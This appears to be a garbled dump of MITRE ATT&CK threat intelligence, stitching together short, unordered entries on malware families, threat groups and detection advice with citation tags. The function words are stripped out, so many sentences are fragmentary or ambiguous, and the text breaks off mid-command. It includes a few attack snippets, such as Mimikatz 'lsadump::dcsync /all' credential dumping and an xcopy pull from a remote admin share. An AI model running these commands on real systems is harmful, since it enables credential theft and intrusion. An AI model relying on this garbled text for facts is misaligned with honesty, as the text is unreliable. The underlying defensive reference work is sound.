[GreyEnergy](https://attack.mitre.org/software/S0342) chooses service, drops DLL file, writes serviceDLL Registry key.(Citation: ESET GreyEnergy Oct 2018) Upgrade management services supported compatible version.  Specifically, version providing increased password complexity policy enforcement preventing default weak passwords.  monitoring social media activity organization. Suspicious activity include personas claiming organization created/modified accounts numerous connection requests accounts affiliated organization.
Detection efforts focused stages adversary lifecycle, Initial Access (ex: [Spearphishing Service](https://attack.mitre.org/techniques/T1566/003)). [JHUHUGIT](https://attack.mitre.org/software/S0044) variant encodes C2 POST data base64.(Citation: Unit 42 Playbook Dec 2017) [APT29](https://attack.mitre.org/groups/G0016) meek domain fronting plugin [Tor](https://attack.mitre.org/software/S0183) hide destination C2 traffic.(Citation: Mandiant Easy Breach) [AuditCred](https://attack.mitre.org/software/S0347) delete files system.(Citation: TrendMicro Lazarus Nov 2018) [APT28](https://attack.mitre.org/groups/G0007) WindowStyle parameter conceal [PowerShell](https://attack.mitre.org/techniques/T1059/001) windows.(Citation: Palo Alto Sofacy 06-2018) (Citation: McAfee APT28 DDE1 Nov 2017) [OilRig](https://attack.mitre.org/groups/G0049) Remote Desktop Protocol lateral movement. tunneling tools tunnel RDP environment.(Citation: Unit 42 Playbook Dec 2017)(Citation: FireEye APT34 Webinar Dec 2017)(Citation: Crowdstrike GTR2020 Mar 2020) (Citation: FireEye APT33 Guardrail)(Citation: Symantec Elfin Mar 2019) [Clambling](https://attack.mitre.org/software/S0660) ability enumerate Registry keys, including <code>KEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt\strDataDir</code> search bitcoin wallet.(Citation: Trend Micro DRBControl February 2020)(Citation: Talent-Jump Clambling February 2020) [Tonto Team](https://attack.mitre.org/groups/G0131) Python-based tools execution.(Citation: TrendMicro Tonto Team October 2020)  Automatically events log server data repository prevent conditions adversary locate manipulate data local system. possible, minimize time delay event reporting avoid prolonged storage local system. [PoisonIvy](https://attack.mitre.org/software/S0012) hides strings indicators compromise.(Citation: Symantec Darkmoon Aug 2005) [Pay2Key](https://attack.mitre.org/software/S0556) RSA encrypted communications C2.(Citation: Check Pay2Key November 2020) [EnvyScout](https://attack.mitre.org/software/S0634) <code>window.location.pathname</code> ensure embedded files executed C: drive, terminate not.(Citation: MSTIC Nobelium Toolset 2021) Limit user account IAM policies privileges required. temporary credentials accounts valid period time reduce effectiveness compromised accounts. [ccf32](https://attack.mitre.org/software/S1043) `xcopy \\<target_host>\c$\users\public\path.7z c:\users\public\bin\<target_host>.7z /H /Y` archive collected files.(Citation: Bitdefender FunnyDream Campaign November 2020) [Gold Dragon](https://attack.mitre.org/software/S0249) deletes files, 2.hwp, endpoint establishing persistence.(Citation: McAfee Gold Dragon) [Deep Panda](https://attack.mitre.org/groups/G0009) ping identify machines interest.(Citation: Alperovitch 2014) [APT29](https://attack.mitre.org/groups/G0016) written malware variants Visual Basic.(Citation: Cybersecurity Advisory SVR TTP 2021) [Patchwork](https://attack.mitre.org/groups/G0040) payload process hollowing hide UAC bypass vulnerability exploitation svchost.exe.(Citation: Cymmetria Patchwork) [Bumblebee](https://attack.mitre.org/software/S1039) ability search designated file paths Registry virtualized environment multiple products.(Citation: Medium Ali Salem Bumblebee April 2022) [Patchwork](https://attack.mitre.org/groups/G0040) attempted RDP laterally.(Citation: Cymmetria Patchwork) [netstat](https://attack.mitre.org/software/S0104) enumerate local network connections, including active TCP connections network statistics.(Citation: TechNet Netstat) [Ursnif](https://attack.mitre.org/software/S0386) 30 minute delay execution evade sandbox monitoring tools.(Citation: TrendMicro Ursnif File Dec 2014) [Dtrack](https://attack.mitre.org/software/S0567) replace normal flow program execution malicious code.(Citation: CyberBit Dtrack) [KEYMARBLE](https://attack.mitre.org/software/S0271) execute commands cmd.exe.(Citation: US-CERT KEYMARBLE Aug 2018) [Tropic Trooper](https://attack.mitre.org/groups/G0081) lured victims executing malware malicious e-mail attachments.(Citation: Anomali Pirate Panda April 2020) [Starloader](https://attack.mitre.org/software/S0188) decrypts executes shellcode file called Stars.jps.(Citation: Symantec Sowbug Nov 2017) Monitor newly executed processes, setx.exe, abuse COR_PROFILER variable, monitor suspicious unmanaged profiling DLLs loading .NET processes shortly CLR causing abnormal process behavior.(Citation: Red Canary COR_PROFILER 2020) [BADNEWS](https://attack.mitre.org/software/S0128) typically loads DLL file legitimate signed Java VMware executable.(Citation: Forcepoint Monsoon)(Citation: PaloAlto Patchwork Mar 2018) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors deployed malware API calls, including `CreateProcessAsUser`.(Citation: McAfee Honeybee) [Grandoreiro](https://attack.mitre.org/software/S0531) SSL C2 communication.(Citation: IBM Grandoreiro April 2020) [Felismus](https://attack.mitre.org/software/S0171) masqueraded legitimate Adobe Content Management files.(Citation: Forcepoint Felismus Mar 2017) Monitor executed commands arguments modify authorized_keys /etc/ssh/sshd_config files. (Citation: Secureworks BRONZE BUTLER Oct 2017)(Citation: Symantec Tick Apr 2016)(Citation: Trend Micro Tick November 2019) [Helminth](https://attack.mitre.org/software/S0170) config file encrypted RC4.(Citation: Palo Alto OilRig 2016) [ADVSTORESHELL](https://attack.mitre.org/software/S0045) achieves persistence adding <code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> Registry key.(Citation: Kaspersky Sofacy)(Citation: ESET Sednit 2)(Citation: Bitdefender APT28 Dec 2015) [Leviathan](https://attack.mitre.org/groups/G0065) JavaScript create shortcut file Startup folder main backdoor.(Citation: Proofpoint Leviathan Oct 2017)(Citation: FireEye Periscope March 2018) [Koadic](https://attack.mitre.org/software/S0250) Regsvr32 execute additional payloads.(Citation: Github Koadic) [BlackEnergy](https://attack.mitre.org/software/S0089) enabled <code>TESTSIGNING</code> boot configuration option facilitate loading driver component.(Citation: F-Secure BlackEnergy 2014) [Flame](https://attack.mitre.org/software/S0143) module named BeetleJuice Bluetooth functionality ways, including transmitting encoded infected Bluetooth protocol, acting Bluetooth beacon, identifying Bluetooth devices vicinity.(Citation: Symantec Beetlejuice) Monitor network data uncommon data flows., usage abnormal/unexpected protocols. [Dark Caracal](https://attack.mitre.org/groups/G0070) malware Flash Player, Office, PDF documents entice user it.(Citation: Lookout Dark Caracal Jan 2018) [APT41](https://attack.mitre.org/groups/G0096) attempted masquerade files popular anti-virus software.(Citation: FireEye APT41 Aug 2019)(Citation: IB APT 41 June 2021) Establish centralized logging activity container Kubernetes cluster components. Monitor logs actions gather credentials container cloud infrastructure, including discovery API calls unexpected users APIs access Docker logs. Monitor files written disk file extensions, executable. Monitor abnormal PowerShell commands, unusual loading PowerShell drives modules. Windows 10, enable Attack Surface Reduction (ASR) rules block processes created WMI commands running. Note: legitimate tools applications utilize WMI command execution. (Citation: win10_asr) [Pay2Key](https://attack.mitre.org/software/S0556) SQL service encryption process release files locked service.(Citation: Check Pay2Key November 2020) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) tool steal credentials installed browsers including Internet Explorer Google Chrome.(Citation: Zscaler APT31 Covid-19 October 2020) Deny remote local admin credentials log systems. domain user accounts local Administrators multiple systems. Monitor logged domain (DNS) registry data hijack domains subdomains targeting.Much activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Command Control. [Aoqin Dragon](https://attack.mitre.org/groups/G1007) spread malware target networks copying modules folders masquerading removable devices.(Citation: SentinelOne Aoqin Dragon June 2022) [Raindrop](https://attack.mitre.org/software/S0565) built include modified version 7-Zip source code (including export names) Manager source code.(Citation: Symantec RAINDROP January 2021)(Citation: Deep Dive Solorigate January 2021) [DustySky](https://attack.mitre.org/software/S0062) HTTPS C2.(Citation: DustySky) [Threat Group-1314](https://attack.mitre.org/groups/G0028) actors spawned shells remote systems victim network execute commands.(Citation: Dell TG-1314) [Brave Prince](https://attack.mitre.org/software/S0252) variants South  Korea's Daum email service exfiltrate information, variants posted data server post command.(Citation: McAfee Gold Dragon) [Carbanak](https://attack.mitre.org/groups/G0008) copied legitimate service names malicious services.(Citation: Kaspersky Carbanak) [PHOREAL](https://attack.mitre.org/software/S0158) communicates ICMP C2.(Citation: FireEye APT32 2017) [Silence](https://attack.mitre.org/groups/G0091) injected DLL library Trojan fwmain32.exe process.(Citation: IB Silence Sept 2018) Monitor files accessed exfiltration, file reads process active network connection. monitor investigate host adapter settings, addition replication communication interfaces.  [APT1](https://attack.mitre.org/groups/G0006) credential dumping [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: Mandiant APT1) [SUNBURST](https://attack.mitre.org/software/S0559) encrypted C2 traffic single-byte-XOR cipher.(Citation: FireEye SUNBURST Backdoor December 2020) [DarkComet](https://attack.mitre.org/software/S0334) steal data clipboard.(Citation: Malwarebytes DarkComet March 2018) [Dtrack](https://attack.mitre.org/software/S0567)’s dropper keylogging executable.(Citation: Securelist Dtrack) [Gamaredon Group](https://attack.mitre.org/groups/G0047) obfuscated .NET executables inserting junk code.(Citation: ESET Gamaredon June 2020)	 [Out1](https://attack.mitre.org/software/S0594) ability encode data.(Citation: Trend Micro Muddy Water March 2021) [Imminent Monitor](https://attack.mitre.org/software/S0434) keylogging module.(Citation: Imminent Unit42 Dec2019) [PolyglotDuke](https://attack.mitre.org/software/S0518) retrieve payloads C2 server.(Citation: ESET Dukes October 2019) [CrossRAT](https://attack.mitre.org/software/S0235) capable screen captures.(Citation: Lookout Dark Caracal Jan 2018) [TEMP.Veles](https://attack.mitre.org/groups/G0088) created staging folders directories infrequently legitimate users processes.(Citation: FireEye TRITON 2019) [Fox Kitten](https://attack.mitre.org/groups/G0117) 7-Zip archive data.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [SamSam](https://attack.mitre.org/software/S0370) AES DES encrypt payloads payload components.(Citation: Sophos SamSam Apr 2018)(Citation: Talos SamSam Jan 2018) [Gelsemium](https://attack.mitre.org/software/S0666) custom shellcode map embedded DLLs memory.(Citation: ESET Gelsemium June 2021) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). (Citation: TrendMicro BlackTech June 2017)(Citation: Symantec Palmerworm Sep 2020) [MobileOrder](https://attack.mitre.org/software/S0079) AES encrypt C2 communications.(Citation: Scarlet Mimic Jan 2016) [S-Type](https://attack.mitre.org/software/S0085) deleted accounts created.(Citation: Cylance Dust Storm) Monitor start folder additions changes. Tools Sysinternals Autoruns detect attempts persistence, including startup folders. (Citation: TechNet Autoruns) [KONNI](https://attack.mitre.org/software/S0356) <code>net session</code> victim's machine.(Citation: Malwarebytes Konni Aug 2021)  [RATANKBA](https://attack.mitre.org/software/S0241) runs <code>whoami</code> <code>query user</code> commands.(Citation: RATANKBA) resources [Prikormka](https://attack.mitre.org/software/S0113) encrypted simple XOR operation encoded Base64.(Citation: ESET Operation Groundbait) [Prikormka](https://attack.mitre.org/software/S0113) module captures screenshots victim's desktop.(Citation: ESET Operation Groundbait) [Denis](https://attack.mitre.org/software/S0354) collects OS victim’s machine.(Citation: Securelist Denis April 2017)(Citation: Cybereason Cobalt Kitty 2017) [SUGARDUMP](https://attack.mitre.org/software/S1042)'s scheduled task named `MicrosoftInternetExplorerCrashRepoeterTaskMachineUA` `MicrosoftEdgeCrashRepoeterTaskMachineUA`, depending Windows OS version.(Citation: Mandiant UNC3890 Aug 2022)  [HTTPBrowser](https://attack.mitre.org/software/S0070)'s code obfuscated structured exception handling return-oriented programming.(Citation: Dell TG-3390) [Unknown Logger](https://attack.mitre.org/software/S0130) capable spreading USB devices.(Citation: Forcepoint Monsoon) [Epic](https://attack.mitre.org/software/S0091) recursively searches .doc files collects directory listing Desktop, %TEMP%, %WINDOWS%\Temp directories.(Citation: Kaspersky Turla)(Citation: Kaspersky Turla Aug 2014) [RemoteCMD](https://attack.mitre.org/software/S0166) execute commands remotely creating service remote system.(Citation: Symantec Buckeye) [CopyKittens](https://attack.mitre.org/groups/G0052) encrypts data substitute cipher prior exfiltration.(Citation: CopyKittens Nov 2015) [Clambling](https://attack.mitre.org/software/S0660) browse directories compromised host.(Citation: Trend Micro DRBControl February 2020)(Citation: Talent-Jump Clambling February 2020) [Machete](https://attack.mitre.org/software/S0409) takes photos computer’s camera.(Citation: Securelist Machete Aug 2014)(Citation: Cylance Machete Mar 2017)(Citation: 360 Machete Sep 2020) [KONNI](https://attack.mitre.org/software/S0356) steal profiles (containing credential information) Firefox, Chrome, Opera.(Citation: Talos Konni 2017) [Stuxnet](https://attack.mitre.org/software/S0603) WMI <code>explorer.exe</code> token execute remote share.(Citation: Symantec W.32 Stuxnet Dossier) [Rocke](https://attack.mitre.org/groups/G0106) Pastebin, Gitee, GitLab Command Control.(Citation: Anomali Rocke March 2019)(Citation: Talos Rocke August 2018) Monitor executed commands arguments attempt screen captures desktop gather operation. [NETWIRE](https://attack.mitre.org/software/S0198) .NET packer tools evade detection.(Citation: Red Canary NETWIRE January 2020) [Ramsay](https://attack.mitre.org/software/S0458) included rootkit evade defenses.(Citation: Eset Ramsay 2020)	 [PoetRAT](https://attack.mitre.org/software/S0428) distributed malicious Word documents.(Citation: Talos PoetRAT April 2020) Monitor windows registry values abuse Windows service control manager execute malicious commands payloads. [TSCookie](https://attack.mitre.org/software/S0436) multiple protocols including HTTPS communication command control (C2) servers.(Citation: JPCert BlackTech Malware September 2019)(Citation: JPCert TSCookie March 2018) [NanHaiShu](https://attack.mitre.org/software/S0228) encodes files Base64.(Citation: fsecure NanHaiShu July 2016) [TA551](https://attack.mitre.org/groups/G0127) spoofed company emails acquired email clients infected hosts target individuals.(Citation: Unit 42 TA551 Jan 2021) Monitor firewall rules, unexpected modifications allowing cleaning previous tampering enabled malicious network traffic. [Sandworm Team](https://attack.mitre.org/groups/G0034) C2 server HTTP.(Citation: ESET Telebots Dec 2016)	 Public Key Pinning (HPKP) method mitigate potential [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) situations adversary mis-issued fraudulent certificate intercept encrypted communications enforcing expected certificate. (Citation: Wikipedia HPKP) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors encoded commands command line.(Citation: Talos Frankenstein June 2019) Monitor unexpected deletion log file, typically stored /var/logs /Library/Logs.  Monitor creation modification serverless resources functions workflows. [Aria-body](https://attack.mitre.org/software/S0456) ability collect data USB devices.(Citation: CheckPoint Naikon 2020) [Earth Lusca](https://attack.mitre.org/groups/G1006) performed watering hole attacks.(Citation: TrendMicro EarthLusca 2022) [BOOTRASH](https://attack.mitre.org/software/S0114) unallocated disk space partitions hidden file stores components Nemesis bootkit.(Citation: FireEye Bootkits) Configure default account policy enable logging. Manage policies ensure users permissions logging policies. (Citation: Securelist DarkVishnya Dec 2018)  Monitor analyze traffic patterns packet inspection LDAP MSRPC follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). [down_new](https://attack.mitre.org/software/S0472) ability list directories compromised host.(Citation: Trend Micro Tick November 2019) [Astaroth](https://attack.mitre.org/software/S0373) collects clipboard OpenClipboard() GetClipboardData() libraries. (Citation: Cybereason Astaroth Feb 2019) [HermeticWizard](https://attack.mitre.org/software/S0698) `OpenRemoteServiceManager` create service.(Citation: ESET Hermetic Wizard March 2022) [APT41](https://attack.mitre.org/groups/G0096) modified legitimate Windows services install malware backdoors.(Citation: FireEye APT41 Aug 2019)(Citation: IB APT 41 June 2021) [APT41](https://attack.mitre.org/groups/G0096) created StorSyncSvc service provide persistence Cobalt Strike.(Citation: FireEye APT41 March 2020) [LockerGoga](https://attack.mitre.org/software/S0372) installation preceded "task kill" command disable anti-virus.(Citation: Wired Lockergoga 2019) Monitor Registry (ex: <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default</code>) values malicious attempts conceal adversary network connection history. [Astaroth](https://attack.mitre.org/software/S0373) collects machine keyboard language system. (Citation: Cofense Astaroth Sept 2018)(Citation: Cybereason Astaroth Feb 2019) [Machete](https://attack.mitre.org/software/S0409) packed NSIS.(Citation: ESET Machete July 2019)  [Attor](https://attack.mitre.org/software/S0438)'s dispatcher establish persistence adding Registry key logon script <code>HKEY_CURRENT_USER\Environment "UserInitMprLogonScript" </code>.(Citation: ESET Attor Oct 2019) [Gamaredon Group](https://attack.mitre.org/groups/G0047) malware rundll32 launch additional malicious components.(Citation: ESET Gamaredon June 2020) Monitor unusual kernel driver installation activity  [Catchamas](https://attack.mitre.org/software/S0261) collects keystrokes victim’s machine.(Citation: Symantec Catchamas April 2018) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors [Mimikatz](https://attack.mitre.org/software/S0002) `privilege::debug` `lsadump::dcsync /all` flags dump account credentials.(Citation: FoxIT Wocao December 2019) [AppleSeed](https://attack.mitre.org/software/S0622) UPX packers payload DLL.(Citation: Malwarebytes Kimsuky June 2021) Modification existing services occur frequently. service binary path failure parameters changed values typical service correlate software updates, malicious activity. (Citation: Baumgartner Naikon 2015)(Citation: Bitdefender Naikon April 2021) Monitor newly executed processes indicative credential dumping. Windows 8.1 Windows Server 2012 R2, monitor Windows Logs LSASS.exe creation verify LSASS started protected process. [Transparent Tribe](https://attack.mitre.org/groups/G0134) compromised domains targeted malicious campaigns.(Citation: Proofpoint Operation Transparent Tribe March 2016) [MuddyWater](https://attack.mitre.org/groups/G0069) targeted government agency employees spearphishing e-mails.(Citation: Anomali Static Kitten February 2021)	  [Dipsind](https://attack.mitre.org/software/S0200) download remote files.(Citation: PLATINUM April 2016) [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Get-MicrophoneAudio</code> Exfiltration module record microphone audio.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) (Citation: Symantec Chafer Dec 2015)(Citation: Securelist Remexi Jan 2019)(Citation: Symantec Chafer February 2018) [DarkWatchman](https://attack.mitre.org/software/S0673) Base64 encode PowerShell commands. [DarkWatchman](https://attack.mitre.org/software/S0673) delivered compressed RAR payloads ZIP files victims.(Citation: Prevailion DarkWatchman 2021) [HermeticWiper](https://attack.mitre.org/software/S0697) `AdjustTokenPrivileges` grant privileges debugging `SeDebugPrivilege`, creating backups `SeBackupPrivilege`, loading drivers `SeLoadDriverPrivilege`, shutting local `SeShutdownPrivilege`.(Citation: Qualys Hermetic Wiper March 2022)(Citation: Crowdstrike DriveSlayer February 2022) [Bundlore](https://attack.mitre.org/software/S0482) <code>mktemp</code> utility unique file directory names payloads, <code>TMP_DIR=`mktemp -d -t x</code>.(Citation: 20 macOS Common Tools Techniques) [RCSession](https://attack.mitre.org/software/S0662) identify processes based PID.(Citation: Profero APT27 December 2020) [EVILNUM](https://attack.mitre.org/software/S0568) malware variant, TerraTV, legitimate TeamViewer application connect compromrised machines.(Citation: ESET EvilNum July 2020) Monitor third-party application logging, messaging, artifacts perform Endpoint Denial Service (DoS) attacks degrade block availability services users. addition network level detections, endpoint logging instrumentation detection. Attacks targeting applications generate logs server, application server, database server identify type attack, impact felt. Externally monitor availability services targeted Endpoint DoS. Monitoring SMB traffic systems captured decoded network share session file transfer activity. [TeamTNT](https://attack.mitre.org/groups/G0139) <code>netstat -anp</code> search rival malware connections.(Citation: Trend Micro TeamTNT) [TeamTNT](https://attack.mitre.org/groups/G0139) `libprocesshider` modify <code>/etc/ld.so.preload</code>.(Citation: ATT TeamTNT Chimaera September 2020) Detection technique difficult APIs used. Telemetry data API depending used, provide context malicious activity occurring system. Behavior technique include unknown unusual process accessing APIs devices software interact video camera, recording devices, recording software, process periodically writing files disk video camera image data.  Monitor failed authentication attempts accounts result password spraying attempts. difficult detect hashes cracked, scope target network. (ex: Windows EID 4625 5379) Ensure critical files abused adversaries restrictive permissions owned appropriately privileged account, access required users inhibit functionality. [TSCookie](https://attack.mitre.org/software/S0436) ability inject code svchost.exe, iexplorer.exe, explorer.exe, default browser processes.(Citation: JPCert BlackTech Malware September 2019) [Ember Bear](https://attack.mitre.org/groups/G1003) source scripts GitHub.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 )  [Helminth](https://attack.mitre.org/software/S0170) establishes persistence creating shortcut Start Menu folder.(Citation: Palo Alto OilRig 2016) [Elise](https://attack.mitre.org/software/S0081) executes <code>net start</code> initial communication remote server.(Citation: Lotus Blossom Jun 2015) [Naikon](https://attack.mitre.org/groups/G0019) modified victim's Windows registry establish persistence.(Citation: Bitdefender Naikon April 2021) [The White Company](https://attack.mitre.org/groups/G0089) checked specific antivirus products target’s computer, including Kaspersky, Quick Heal, AVG, BitDefender, Avira, Sophos, Avast!, ESET.(Citation: Cylance Shaheen Nov 2018) [ADVSTORESHELL](https://attack.mitre.org/software/S0045) encrypts 3DES algorithm hardcoded key prior exfiltration.(Citation: ESET Sednit 2) [Threat Group-3390](https://attack.mitre.org/groups/G0027) DLL side-loading, including legitimate Kaspersky antivirus variants DLL acts stub loader loads executes code.(Citation: Dell TG-3390)(Citation: SecureWorks BRONZE UNION June 2017)(Citation: Securelist LuckyMouse June 2018)(Citation: Unit42 Emissary Panda 2019) [NanHaiShu](https://attack.mitre.org/software/S0228) executes additional Jscript code victim's machine.(Citation: fsecure NanHaiShu July 2016) [Volgmer](https://attack.mitre.org/software/S0180) checks Registry keys.(Citation: US-CERT Volgmer 2 Nov 2017) [Melcoz](https://attack.mitre.org/software/S0530) distributed AutoIt loader script.(Citation: Securelist Brazilian Banking Malware July 2020) [FoggyWeb](https://attack.mitre.org/software/S0661) dynamic XOR key custom XOR methodology encode data exfiltration. Also, [FoggyWeb](https://attack.mitre.org/software/S0661) encode C2 command output legitimate WebP file.(Citation: MSTIC FoggyWeb September 2021) [Cobalt Strike](https://attack.mitre.org/software/S0154) track key presses keylogger module.(Citation: cobaltstrike manual)(Citation: Amnesty Intl. Ocean Lotus February 2021)(Citation: Cobalt Strike Manual 4.3 November 2020) [OceanSalt](https://attack.mitre.org/software/S0346) collect victim’s IP address.(Citation: McAfee Oceansalt Oct 2018) [Okrum](https://attack.mitre.org/software/S0439)'s loader detect presence emulator calls GetTickCount API, checking time accelerated.(Citation: ESET Okrum July 2019) [UNC2452](https://attack.mitre.org/groups/G0118) WMI event subscriptions persistence.(Citation: 365 Defender Solorigate)(Citation: Deep Dive Solorigate January 2021) [Grandoreiro](https://attack.mitre.org/software/S0531) C2 Google Docs.(Citation: Securelist Brazilian Banking Malware July 2020) [Chimera](https://attack.mitre.org/groups/G0114) [Cobalt Strike](https://attack.mitre.org/software/S0154) C2 beacons data exfiltration.(Citation: NCC Chimera January 2021)  Monitor newly constructed logon behavior systems share accounts, user, admin, service accounts. Examples: account logged multiple systems simultaneously; multiple accounts logged machine simultaneously; accounts logged odd times (ex: user present) business hours. Activity interactive login sessions process ownership accounts execute binaries remote account. Correlate security systems login user active login session entered building VPN access). Configure robust, consistent account activity audit policies enterprise externally accessible services.(Citation: TechNet Audit Policy)  [ChChes](https://attack.mitre.org/software/S0144) alter victim's proxy configuration.(Citation: PWC Cloud Hopper Technical Annex April 2017) [Nebulae](https://attack.mitre.org/software/S0630) capability upload collected files C2.(Citation: Bitdefender Naikon April 2021) Identify block malicious software executed Winlogon helper process whitelisting (Citation: Beechey 2010) tools AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) capable auditing blocking unknown DLLs. [TrickBot](https://attack.mitre.org/software/S0266) Windows API call, CreateProcessW(), manage execution flow.(Citation: S2 Grupo TrickBot June 2017) [TrickBot](https://attack.mitre.org/software/S0266) <code>Nt*</code> API functions perform [Process Injection](https://attack.mitre.org/techniques/T1055).(Citation: Joe Trickbot) [FIN5](https://attack.mitre.org/groups/G0053) scripts save memory dump data specific directory hosts victim environment.(Citation: Mandiant FIN5 GrrCON Oct 2016) [EnvyScout](https://attack.mitre.org/software/S0634) executed malicious files attached e-mails.(Citation: MSTIC Nobelium Toolset 2021) [FinFisher](https://attack.mitre.org/software/S0182) obtains hardware device list checks MD5 vendor equal predefined list check sandbox/virtualized environments.(Citation: FinFisher March 2018) settings prevent applications running downloaded Apple Store mitigate issues. [Trojan.Karagany](https://attack.mitre.org/software/S0094) base64 encode AES-128-CBC encrypt data prior transmission.(Citation: Secureworks Karagany July 2019) Monitor newly constructed files match existing service executable, detected correlated suspicious behavior.   [TSCookie](https://attack.mitre.org/software/S0436) ability decrypt, load, execute DLL resources.(Citation: JPCert TSCookie March 2018) [Ryuk](https://attack.mitre.org/software/S0446) enumerated files folders mounted drives.(Citation: CrowdStrike Ryuk January 2019)	 [LightNeuron](https://attack.mitre.org/software/S0395) configured automatically exfiltrate files directory.(Citation: ESET LightNeuron 2019) [PUNCHBUGGY](https://attack.mitre.org/software/S0196) gather user names.(Citation: Morphisec ShellTea June 2019) [KeyBoy](https://attack.mitre.org/software/S0387) installs service malicious DLL dropped disk.(Citation: Rapid7 KeyBoy Jun 2013) [jRAT](https://attack.mitre.org/software/S0283) command access.(Citation: Kaspersky Adwind Feb 2016) [BUBBLEWRAP](https://attack.mitre.org/software/S0043) communicate HTTPS.(Citation: FireEye admin@338) [KONNI](https://attack.mitre.org/software/S0356) stored collected discovered processes tmp file.(Citation: Malwarebytes Konni Aug 2021) [Gelsemium](https://attack.mitre.org/software/S0666) drop <code>C:\Windows\System32\spool\prtprocs\x64\winprint.dll</code> loaded automatically spoolsv Windows service.(Citation: ESET Gelsemium June 2021) Remove vulnerable Policy Preferences.(Citation: MS14-025) [More_eggs](https://attack.mitre.org/software/S0284) RC4-based encryption method C2 communications.(Citation: Security Intelligence Eggs Aug 2019) [Remsec](https://attack.mitre.org/software/S0125) capable deleting files victim. securely removes collecting exfiltrating data.(Citation: Symantec Remsec IOCs)(Citation: Kaspersky ProjectSauron Report)(Citation: Kaspersky ProjectSauron Technical Analysis) [Operation Spalax](https://attack.mitre.org/campaigns/C0005), threat actors Nullsoft Scriptable Install (NSIS) scripts install malware.(Citation: ESET Operation Spalax Jan 2021) [QakBot](https://attack.mitre.org/software/S0650) identify host checking folder.(Citation: ATT QakBot April 2021) Patch BIOS EFI necessary. Monitor common formats RTLO characters filenames \u202E, [U+202E], %E2%80%AE. Defenders check analysis tools ensure interpret RTLO character print true file it. [Wizard Spider](https://attack.mitre.org/groups/G0102) installed [TrickBot](https://attack.mitre.org/software/S0266) service named ControlServiceA establish persistence.(Citation: CrowdStrike Grim Spider 2019) Windows 8.1, Windows Server 2012 R2, versions LSA Protected Process Light (PPL) setting Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL</code>, requires SSP DLLs signed Microsoft. (Citation: Graeber 2014) (Citation: Configure LSA) [Magic Hound](https://attack.mitre.org/groups/G0059) malware IRC C2.(Citation: Unit 42 Magic Hound Feb 2017) [APT28](https://attack.mitre.org/groups/G0007) routed traffic [Tor](https://attack.mitre.org/software/S0183) VPN servers obfuscate activities.(Citation: TrendMicro Pawn Storm Dec 2020) SSL/TLS inspection contents encrypted sessions network-based indicators malware communication protocols. [CostaRicto](https://attack.mitre.org/campaigns/C0004), threat actors layer proxies manage C2 communications.(Citation: BlackBerry CostaRicto November 2020)  [Sykipot](https://attack.mitre.org/software/S0018) functionality enables targeting smart card technologies proxy authentication connections restricted network resources detected hardware tokens.(Citation: Alienvault Sykipot DOD Smart Cards) [SLOWDRIFT](https://attack.mitre.org/software/S0218) cloud based services C2.(Citation: FireEye APT37 Feb 2018) [HermeticWiper](https://attack.mitre.org/software/S0697) ability deploy infected system's default domain policy.(Citation: ESET Hermetic Wizard March 2022) [LAPSUS$](https://attack.mitre.org/groups/G1004) searched victim's network code repositories GitLab GitHub discover high-privilege account credentials.(Citation: MSTIC DEV-0537 Mar 2022) [FlawedAmmyy](https://attack.mitre.org/software/S0381) enumerates current user initial infection.(Citation: Proofpoint TA505 Mar 2018)(Citation: Korean FSI TA505 2020) [DustySky](https://attack.mitre.org/software/S0062) lists installed software infected machine.(Citation: Kaspersky MoleRATs April 2019) [DarkHydrus](https://attack.mitre.org/groups/G0079) malware required users hit enable button Excel .iqy file downloaded.(Citation: Unit 42 DarkHydrus July 2018)(Citation: Unit 42 Playbook Dec 2017) [RTM](https://attack.mitre.org/software/S0148) delivered spearphishing attachments disguised PDF documents.(Citation: Unit42 Redaman January 2019) [USBStealer](https://attack.mitre.org/software/S0136) exfiltrates collected files removable media air-gapped victims.(Citation: ESET Sednit USBStealer 2014) [Lazarus Group](https://attack.mitre.org/groups/G0032) studied publicly targeted organization tailor spearphishing efforts specific departments individuals.(Citation: ESET Lazarus Jun 2020)(Citation: ClearSky Lazarus Aug 2020)(Citation: Kaspersky ThreatNeedle Feb 2021) [Kevin](https://attack.mitre.org/software/S1020) enumerate OS version hostname targeted machine.(Citation: Kaspersky Lyceum October 2021) [Kimsuky](https://attack.mitre.org/groups/G0094) lured victims clicking malicious links.(Citation: KISA Operation Muzabi) [Wizard Spider](https://attack.mitre.org/groups/G0102) SMB drop Cobalt Strike Beacon domain controller lateral movement.(Citation: DFIR Ryuk 2 Hour Speed November 2020)(Citation: DFIR Ryuk's Return October 2020) [Earth Lusca](https://attack.mitre.org/groups/G1006) command <code>powershell “Get-EventLog -LogName security -Newest 500 | {$_.EventID -eq 4624} | format-list -
